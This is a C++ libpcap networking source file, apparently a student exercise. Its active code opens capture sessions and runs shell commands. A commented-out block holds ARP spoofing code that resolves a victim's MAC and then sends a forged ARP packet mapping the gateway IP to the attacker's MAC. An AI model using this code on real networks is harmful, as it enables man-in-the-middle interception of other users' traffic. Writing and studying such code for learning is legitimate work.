// netlib.cpp (pcaplib.c에서 수정)
#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <pcap.h>

#include "netsession.h"

#include <netinet/in.h>
#include <netinet/ether.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>

namespace Netpkt {
}

namespace Netssn {
	bool execute_shell(char* shell, char* res, int size){
		FILE *sh = popen(shell, "r");
		if(sh == NULL)return 0;

		fgets(res, size, sh);
		pclose(sh);
		return 1;
	}

	bool get_gateway_IP(Netpkt::IP ip){
		return 0;
	}

	void Session::open_session(){
		char ebuf[PCAP_ERRBUF_SIZE];
		const char* device = pcap_lookupdev(ebuf);
		if(device == NULL) throw NetException(ebuf);
		this->open_session(device);
	}

	void Session::open_session(const char* device){
		char ebuf[PCAP_ERRBUF_SIZE];
		this->mySession = pcap_open_live(device, 256, 0, -1, ebuf);
		if(this->mySession == NULL) throw NetException(ebuf);
	}
}

/*
#define PACKET_MAXSIZE 1000

// https://wiki.kldp.org/KoreanDoc/html/Libpcap-KLDP/function.html : pcap.h functions

char ebuf[PCAP_ERRBUF_SIZE];

void printer(u_char* dummy, const struct pcap_pkthdr* pkthdr, const u_char* packet);

// close the port
void closedevice(pcap_t* pd){
	pcap_close(pd);
}

// find gateway ip : https://wiki.amahi.org/index.php/Find_Your_Gateway_IP

int getGatewayIP(int* ip){
	char buf[32];
	if(executeShell("ip route | grep default | awk '{print $3}'", buf, 28) < 0)return -1;
	sscanf(buf, "%d.%d.%d.%d", &ip[0], &ip[1], &ip[2], &ip[3]);
	return 0;
}

int getMyMAC(u_char* mac){
	char buf[32], sh[64];
	char *device = pcap_lookupdev(ebuf);
	if(device == NULL)return -1;

	sprintf(sh, "ifconfig -a | grep %s | awk '{print $5}'", device);
	if(executeShell(sh, buf, 28) < 0)return -1;

	sscanf(buf, "%X:%X:%X:%X:%X:%X", &mac[0], &mac[1], &mac[2], &mac[3], &mac[4], &mac[5]);
	return 0;
}

int getMyIP(int* ip){
	char buf[32], sh[128];
	char *device = pcap_lookupdev(ebuf);
	if(device == NULL)return -1;

	sprintf(sh, "ifconfig -a | grep -A1 %s | tail -n 1 | tr ':' ' ' | awk '{print $3}'", device);
	if(executeShell(sh, buf, 28) < 0)return -1;

	sscanf(buf, "%d.%d.%d.%d", &ip[0], &ip[1], &ip[2], &ip[3]);
	return 0;
}

u_char pkt1[PACKET_MAXSIZE], pkt2[PACKET_MAXSIZE], pkt3[PACKET_MAXSIZE];
// first request, first response, attack packet

void memshort(u_char* addr, u_short num){
	addr[1] = (u_char)(num >> 8);
	addr[0] = (u_char)(num & 255);
}

int cmpshort(u_char* addr, u_short num){
	if(addr[1] != (u_char)(num >> 8))return 0;
	return addr[0] == (u_char)(num & 255);
}

void makeARPPacket(u_char* packet, u_char* srcmac, int* srcip, u_char* dstmac, int* dstip){
	// ethernet
	if(dstmac == NULL)memset(packet, 0xFF, 6); // broadcast
	else memcpy(packet, dstmac, 6);
	memcpy(packet+6, srcmac, 6);
	memshort(packet+12, htons(ETHERTYPE_ARP));

	// ARP
	memshort(packet+14+0, htons(ARPHRD_ETHER)); // HW Type
	memshort(packet+14+2, htons(ETHERTYPE_IP)); // Protocol Type
	packet[14+4] = ETHER_ADDR_LEN; // HW Addr Length
	packet[14+5] = 0x04; // Protocol Addr Length
	memshort(packet+14+6, htons(ARPOP_REQUEST)); // Opcode

	memcpy(packet+14+8, srcmac, 6); // src HA
	packet[14+14] = (u_char)srcip[0]; packet[14+15] = (u_char)srcip[1];
	packet[14+16] = (u_char)srcip[2]; packet[14+17] = (u_char)srcip[3]; // src Protocol

	if(dstmac == NULL)memset(packet+14+18, 0xFF, 6); // Unknown
	else memcpy(packet+14+18, dstmac, 6); // dst HA
	packet[14+24] = (u_char)dstip[0]; packet[14+25] = (u_char)dstip[1];
	packet[14+26] = (u_char)dstip[2]; packet[14+27] = (u_char)dstip[3]; // dst Protocol
}

void opendevice(pcap_t *pd){
	const char* device = pcap_lookupdev(ebuf);
	if(device == NULL) {puts(ebuf); exit(-1);}

	pd = pcap_open_live(device, 256, 0, -1, ebuf);
	if(pd == NULL){
		puts(ebuf);
		exit(-1);
	}
}

int islegal;

void sendFakePacket(int* vct, int* gtw){ // victim ip, gateway ip
	u_char mymac[6], vmac[6];
	int atk[4];
	struct ether_addr *eth;
	pcap_t *pd;

	printf("Gateway IP : %d.%d.%d.%d\n", gtw[0], gtw[1], gtw[2], gtw[3]);
	getMyMAC(mymac);
	eth = (struct ether_addr*) mymac;
	printf("Attacker MAC : %s\n", ether_ntoa(eth));
	getMyIP(atk);
	printf("Attacker IP : %d.%d.%d.%d\n", atk[0], atk[1], atk[2], atk[3]);

	opendevice(pd);

	makeARPPacket(pkt1, mymac, atk, NULL, vct);
	int i;
	for(i=0; i<42; i++)printf("%02x ", pkt1[i]);
	puts("");

	while(1){
		islegal = 0;
		if(pcap_inject(pd, pkt1, 42) < 0){	// send packet
			puts("pcap simulating error!");
			exit(-1);
		}
		if(pcap_loop(pd, 1, printer, NULL) < 0){	// catch packet
			puts("pcap simulating error!");
			exit(-1);
		}

		if(islegal == 1){ // if it is correct ARP response
			if(strncmp(mymac, pkt2, 6) != 0)continue; // response dest != attacker MAC
			memcpy(vmac, pkt2+6, 6);
			break;
		}
	}
	eth = (struct ether_addr*) vmac;
	printf("Victim MAC : %s\n", ether_ntoa(eth));

	makeARPPacket(pkt3, mymac, gtw, vmac, vct);
	for(i=0; i<42; i++)printf("%02x ", pkt3[i]);
	puts("");

	if(pcap_inject(pd, pkt3, 42) < 0){	// send packet
		puts("pcap simulating error!");
		exit(-1);
	}
}

// http://www.joinc.co.kr/w/Site/Network_Programing/AdvancedComm/pcap_intro : packet analysis

// get the packet
void printer(u_char* dummy, const struct pcap_pkthdr* pkthdr, const u_char* packet){
//	puts("ABC");
	if(cmpshort(packet+12, htons(ETHERTYPE_ARP)) != 0)return;
//	puts("ABC");
	if(pkthdr->len != 42)return; // if is not ethernet+ARP
//	puts("ABC");
	if(cmpshort(packet+14+6, htons(ARPOP_REPLY)) != 0)return;
	memcpy(pkt2, packet, pkthdr->len); islegal = 1;
}*/
